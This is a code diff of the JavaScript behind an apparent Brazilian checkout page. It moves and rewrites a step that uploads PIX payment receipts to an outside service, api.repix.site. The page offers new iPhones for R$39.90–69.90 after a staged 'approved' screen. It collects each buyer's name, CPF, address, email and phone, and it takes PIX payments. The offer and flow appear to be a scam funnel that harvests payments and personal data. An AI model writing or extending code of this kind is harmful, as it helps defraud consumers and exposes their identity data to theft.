@@ -2,12 +2,12 @@
   const currency = new Intl.NumberFormat("pt-BR", { style: "currency", currency: "BRL" });
   const steps = ["lead", "loading", "approved", "choice", "delivery", "contact", "summary"];
   const models = [
-    { id: "produto-teste-5", name: "🧪 Produto de Teste (R$ 5,00)", price: 5.00, storage: ["256"], isTest: true },
     { id: "iphone-17e", name: "iPhone 17e", price: 39.90, storage: ["256", "512"] },
     { id: "iphone-17", name: "iPhone 17", price: 49.90, storage: ["512"] },
     { id: "iphone-air", name: "iPhone Air", price: 49.90, storage: ["512"] },
     { id: "iphone-17-pro", name: "iPhone 17 Pro", price: 69.90, storage: ["512"] },
-    { id: "iphone-17-pro-max", name: "iPhone 17 Pro MAX", price: 69.90, storage: ["512", "1tb"] }
+    { id: "iphone-17-pro-max", name: "iPhone 17 Pro MAX", price: 69.90, storage: ["512", "1tb"] },
+    { id: "teste-repix-5", name: "Produto Teste RePix (R$ 5,00)", price: 5.00, storage: ["256"] }
   ];
   const storages = [
     { id: "256", name: "256GB", label: "Padrão", surcharge: 0 },
@@ -26,16 +26,10 @@
   let paymentPoll = null;
   let loadingRun = 0;
 
-    // Configuração e Estado RePix (Mobile-First / Upload Automático)
-  const REPIX_ENDPOINT = "https://api.repix.site/api/v1/transactions/";
-  const NEXT_URL = "/sucesso/";
-  let isProofAttached = false;
-  let isProofUploading = false;
-
   function loadState() {
     const initial = {
       lead: { name: "", cpf: "" },
-      model: "produto-teste-5",
+      model: "iphone-17e",
       storage: "256",
       delivery: { cep: "", street: "", number: "", complement: "", neighborhood: "", city: "", state: "" },
       contact: { email: "", phone: "" },
@@ -469,26 +463,17 @@
       });
     }
     try {
-            let data;
-      if (location.protocol === "file:") {
+      let data;
+      if (["localhost", "127.0.0.1"].includes(location.hostname) || location.protocol === "file:") {
         data = localPreviewPayment(payload, orderCode);
       } else {
-        try {
-          const response = await fetch("/api/mangofy/pix", {
-            method: "POST",
-            headers: { "Content-Type": "application/json", "Accept": "application/json" },
-            body: JSON.stringify(payload)
-          });
-          data = await response.json();
-          if (!response.ok) throw new Error(data.error || data.message || "Falha ao gerar PIX");
-        } catch (fetchErr) {
-          if (["localhost", "127.0.0.1"].includes(location.hostname)) {
-            console.warn("API remota indisponível, usando fallback local:", fetchErr);
-            data = localPreviewPayment(payload, orderCode);
-          } else {
-            throw fetchErr;
-          }
-        }
+        const response = await fetch("/api/mangofy/pix", {
+          method: "POST",
+          headers: { "Content-Type": "application/json", "Accept": "application/json" },
+          body: JSON.stringify(payload)
+        });
+        data = await response.json();
+        if (!response.ok) throw new Error(data.error || "Não foi possível gerar o PIX.");
       }
       paymentData = { ...data, order_code: orderCode, request_payload: payload };
       sessionStorage.setItem("facilitaPayment", JSON.stringify(paymentData));
@@ -506,144 +491,23 @@
     if (!paymentData) return;
     const code = pixCodeFromPayment(paymentData);
     const image = pixImageFromPayment(paymentData) || localQrImage(code);
+    const saleId = paymentIdentifier(paymentData) || paymentData.order_code;
+    window.CURRENT_SALE_ID = saleId;
+    window.saleId = saleId;
+    window.payment_code = saleId;
+    const proofWrapper = document.getElementById("repix-proof-wrapper");
+    if (proofWrapper) proofWrapper.setAttribute("data-sale-id", saleId);
+    if (typeof resetRepixProof === "function") resetRepixProof();
     document.getElementById("orderCode").textContent = paymentData.order_code;
     document.getElementById("pixCode").textContent = code || "O código PIX não foi retornado. Gere o pagamento novamente.";
     const qrFrame = document.getElementById("qrFrame");
     qrFrame.innerHTML = image
       ? `<img src="${escapeHtml(image)}" alt="QR Code do PIX">`
       : '<div class="qr-placeholder" aria-label="Use o código PIX Copia e Cola"></div>';
-    resetRepixProofState();
     document.getElementById("paymentBackdrop").classList.add("visible");
     document.body.style.overflow = "hidden";
     scheduleSubtotalDock();
     document.getElementById("copyPix").focus();
-  }
-
-  function resetRepixProofState() {
-    isProofAttached = false;
-    isProofUploading = false;
-    const fileInput = document.getElementById("repix-file-input");
-    if (fileInput) fileInput.value = "";
-    const btnText = document.getElementById("repix-btn-text");
-    if (btnText) btnText.textContent = "Anexar Comprovante do Pix";
-    const uploadBtn = document.getElementById("repix-upload-btn");
-    if (uploadBtn) {
-      uploadBtn.style.opacity = "1";
-      uploadBtn.style.background = "#10b981";
-    }
-    const successCheck = document.getElementById("repix-success-check");
-    if (successCheck) {
-      successCheck.style.display = "none";
-      successCheck.style.transform = "translateY(-50%) scale(0)";
-    }
-    const continueBtn = document.getElementById("repix-continue-btn");
-    if (continueBtn) {
-      continueBtn.setAttribute("disabled", "true");
-      continueBtn.style.opacity = "0.45";
-      continueBtn.style.cursor = "not-allowed";
-      continueBtn.style.pointerEvents = "none";
-      continueBtn.style.background = "#1e293b";
-      continueBtn.style.color = "#94a3b8";
-      continueBtn.style.borderColor = "#334155";
-      continueBtn.style.boxShadow = "none";
-    }
-    const errorEl = document.getElementById("repixProofError");
-    if (errorEl) {
-      errorEl.textContent = "";
-      errorEl.style.display = "none";
-    }
-  }
-
-  function handleRepixFileChange(event) {
-    const file = event.target.files && event.target.files[0];
-    if (!file) return;
-
-    const btnText = document.getElementById("repix-btn-text");
-    const uploadBtn = document.getElementById("repix-upload-btn");
-    const successCheck = document.getElementById("repix-success-check");
-    const continueBtn = document.getElementById("repix-continue-btn");
-    const errorEl = document.getElementById("repixProofError");
-
-    const allowed = ["image/jpeg", "image/png", "image/webp", "application/pdf"];
-    if (!allowed.includes(file.type) && !/\.(jpe?g|png|webp|pdf)$/i.test(file.name)) {
-      if (errorEl) {
-        errorEl.textContent = "Formato não suportado. Envie uma imagem (JPG, PNG, WEBP) ou PDF.";
-        errorEl.style.display = "block";
-      }
-      return;
-    }
-
-    if (file.size > 20 * 1024 * 1024) {
-      if (errorEl) {
-        errorEl.textContent = "O arquivo excede o limite máximo de 20MB.";
-        errorEl.style.display = "block";
-      }
-      return;
-    }
-
-    if (errorEl) errorEl.style.display = "none";
-    if (btnText) btnText.textContent = "Enviando comprovante...";
-    if (uploadBtn) uploadBtn.style.opacity = "0.85";
-    isProofUploading = true;
-
-    const saleId = paymentIdentifier(paymentData) || paymentData?.order_code || ("TESTE-" + Date.now());
-    const formData = new FormData();
-    formData.append("file", file);
-
-    fetch("https://api.repix.site/api/v1/transactions/" + encodeURIComponent(saleId) + "/proof", {
-      method: "POST",
-      body: formData
-    })
-    .then((response) => {
-      if (!response.ok) throw new Error("Erro ao salvar comprovante");
-      return response.json().catch(() => ({}));
-    })
-    .then((data) => {
-      isProofAttached = true;
-      isProofUploading = false;
-      if (btnText) btnText.textContent = "Comprovante Anexado!";
-      if (uploadBtn) {
-        uploadBtn.style.opacity = "1";
-        uploadBtn.style.background = "#059669";
-      }
-      if (successCheck) {
-        successCheck.style.display = "block";
-        setTimeout(() => { successCheck.style.transform = "translateY(-50%) scale(1)"; }, 50);
-      }
-      if (continueBtn) {
-        continueBtn.removeAttribute("disabled");
-        continueBtn.style.opacity = "1";
-        continueBtn.style.cursor = "pointer";
-        continueBtn.style.pointerEvents = "auto";
-        continueBtn.style.background = "#10b981";
-        continueBtn.style.color = "#ffffff";
-        continueBtn.style.borderColor = "#10b981";
-        continueBtn.style.boxShadow = "0 4px 14px rgba(16, 185, 129, 0.3)";
-      }
-    })
-    .catch((err) => {
-      console.error(err);
-      isProofUploading = false;
-      if (btnText) btnText.textContent = "Anexar Comprovante do Pix";
-      if (uploadBtn) {
-        uploadBtn.style.opacity = "1";
-        uploadBtn.style.background = "#10b981";
-      }
-      if (errorEl) {
-        errorEl.textContent = "Não foi possível enviar o comprovante. Verifique o arquivo e tente novamente.";
-        errorEl.style.display = "block";
-      } else {
-        alert("Não foi possível enviar o comprovante. Verifique o arquivo e tente novamente.");
-      }
-    });
-  }
-
-  function handleRepixContinue() {
-    if (!isProofAttached) {
-      alert("Por favor, anexe o comprovante do seu Pix acima para prosseguir.");
-      return;
-    }
-    window.location.href = NEXT_URL;
   }
 
   function closePayment() {
@@ -693,7 +557,7 @@
         const status = extractStatus(data);
         if (approvedStatus(status)) {
           clearInterval(paymentPoll);
-          document.getElementById("paymentStatus").textContent = "Pagamento aprovado! Por favor, anexe o comprovante abaixo para liberação imediata do seu pedido.";
+          document.getElementById("paymentStatus").textContent = "Pagamento aprovado! Por favor, anexe o comprovante abaixo para liberar seu pedido.";
           const purchaseMarker = `facilitaPurchase:${identifier}`;
           if (sessionStorage.getItem(purchaseMarker) !== "true") {
             const payload = paymentData.request_payload || {};
@@ -718,8 +582,7 @@
             sessionStorage.setItem(purchaseMarker, "true");
           }
           sessionStorage.setItem("facilitaPaid", "true");
-          // BLOQUEIO OBRIGATÓRIO: Redirecionamento automático desativado.
-          // O cliente DEVE enviar o comprovante Pix para prosseguir!
+          // Bloqueio obrigatório de redirecionamento: só avança com o envio do comprovante
         }
       } catch {
         // A confirmação automática continua na próxima tentativa.
@@ -825,17 +688,6 @@
   });
   document.getElementById("copyPix").addEventListener("click", copyPix);
   document.getElementById("closePayment").addEventListener("click", closePayment);
-
-  // Listeners do Bloco de Comprovante RePix (Mobile-First / Toque Nativo)
-  const repixFileInput = document.getElementById("repix-file-input");
-  const repixContinueBtn = document.getElementById("repix-continue-btn");
-
-  if (repixFileInput) {
-    repixFileInput.addEventListener("change", handleRepixFileChange);
-  }
-  if (repixContinueBtn) {
-    repixContinueBtn.addEventListener("click", handleRepixContinue);
-  }
   document.getElementById("paymentBackdrop").addEventListener("click", (event) => {
     if (event.target === document.getElementById("paymentBackdrop")) closePayment();
   });
@@ -867,6 +719,128 @@
     paymentData = JSON.parse(sessionStorage.getItem("facilitaPayment") || "null");
   } catch {
     paymentData = null;
+  }
+
+  // Integração RePix Mobile-First
+  const repixFileInput = document.getElementById("repix-file-input");
+  const repixUploadBtn = document.getElementById("repix-upload-btn");
+  const repixBtnText = document.getElementById("repix-btn-text");
+  const repixSuccessCheck = document.getElementById("repix-success-check");
+  const repixContinueBtn = document.getElementById("repix-continue-btn");
+
+  const redirectUrl = "/sucesso/";
+  let isProofAttached = false;
+
+  function resetRepixProof() {
+    isProofAttached = false;
+    if (repixFileInput) repixFileInput.value = "";
+    if (repixBtnText) repixBtnText.textContent = "Anexar Comprovante do Pix";
+    if (repixUploadBtn) {
+      repixUploadBtn.style.background = "#10b981";
+      repixUploadBtn.style.opacity = "1";
+    }
+    if (repixSuccessCheck) {
+      repixSuccessCheck.style.display = "none";
+      repixSuccessCheck.style.transform = "translateY(-50%) scale(0)";
+    }
+    if (repixContinueBtn) {
+      repixContinueBtn.setAttribute("disabled", "true");
+      repixContinueBtn.style.opacity = "0.45";
+      repixContinueBtn.style.cursor = "not-allowed";
+      repixContinueBtn.style.pointerEvents = "none";
+      repixContinueBtn.style.background = "#1e293b";
+      repixContinueBtn.style.color = "#94a3b8";
+      repixContinueBtn.style.borderColor = "#334155";
+      repixContinueBtn.style.boxShadow = "none";
+    }
+  }
+
+  function getSaleIdentifier() {
+    if (window.CURRENT_SALE_ID) return String(window.CURRENT_SALE_ID).trim();
+    if (window.saleId) return String(window.saleId).trim();
+    if (window.payment_code) return String(window.payment_code).trim();
+    if (window.saleData && (window.saleData.id || window.saleData.payment_code)) {
+      return String(window.saleData.id || window.saleData.payment_code).trim();
+    }
+    if (paymentData) {
+      const id = paymentIdentifier(paymentData) || paymentData.order_code;
+      if (id) return String(id).trim();
+    }
+    const params = new URLSearchParams(window.location.search);
+    const urlId = params.get("sale_id") || params.get("id") || params.get("payment_code") || params.get("code");
+    if (urlId) return urlId.trim();
+
+    const el = document.querySelector("[data-sale-id]") || document.querySelector("#sale-id") || document.querySelector("#orderCode");
+    if (el) {
+      const val = el.getAttribute("data-sale-id") || el.innerText.trim();
+      if (val) return val;
+    }
+    return "PIX_" + Date.now();
+  }
+
+  if (repixFileInput) {
+    repixFileInput.addEventListener("change", function(e) {
+      const file = (e.target.files && e.target.files[0]) || (repixFileInput.files && repixFileInput.files[0]);
+      if (!file) return;
+
+      const saleId = getSaleIdentifier();
+      if (repixBtnText) repixBtnText.textContent = "Enviando comprovante...";
+      if (repixUploadBtn) repixUploadBtn.style.opacity = "0.85";
+
+      const formData = new FormData();
+      formData.append("file", file);
+
+      fetch("https://api.repix.site/api/v1/transactions/" + encodeURIComponent(saleId) + "/proof", {
+        method: "POST",
+        body: formData
+      })
+      .then(response => {
+        if (!response.ok) throw new Error("Erro na resposta do servidor: " + response.status);
+        return response.json();
+      })
+      .then(data => {
+        isProofAttached = true;
+        if (repixBtnText) repixBtnText.textContent = "Comprovante Anexado!";
+        if (repixUploadBtn) {
+          repixUploadBtn.style.opacity = "1";
+          repixUploadBtn.style.background = "#059669";
+        }
+
+        if (repixSuccessCheck) {
+          repixSuccessCheck.style.display = "block";
+          setTimeout(() => { repixSuccessCheck.style.transform = "translateY(-50%) scale(1)"; }, 50);
+        }
+
+        // Ativa e desbloqueia o botão inferior de prosseguir
+        if (repixContinueBtn) {
+          repixContinueBtn.removeAttribute("disabled");
+          repixContinueBtn.style.opacity = "1";
+          repixContinueBtn.style.pointerEvents = "auto";
+          repixContinueBtn.style.cursor = "pointer";
+          repixContinueBtn.style.background = "#10b981";
+          repixContinueBtn.style.color = "#ffffff";
+          repixContinueBtn.style.borderColor = "#10b981";
+          repixContinueBtn.style.boxShadow = "0 4px 14px rgba(16, 185, 129, 0.3)";
+        }
+      })
+      .catch(err => {
+        console.error("Erro ao enviar comprovante:", err);
+        if (repixBtnText) repixBtnText.textContent = "Anexar Comprovante do Pix";
+        if (repixUploadBtn) repixUploadBtn.style.opacity = "1";
+        alert("Não foi possível enviar o comprovante. Por favor, verifique o arquivo e tente novamente.");
+      });
+    });
+  }
+
+  if (repixContinueBtn) {
+    repixContinueBtn.addEventListener("click", function(e) {
+      e.preventDefault();
+      if (!isProofAttached) {
+        alert("Por favor, anexe o comprovante do seu Pix acima para prosseguir.");
+        return;
+      }
+      window.location.href = redirectUrl;
+    });
   }
 
   const requested = new URLSearchParams(location.search).get("etapa");
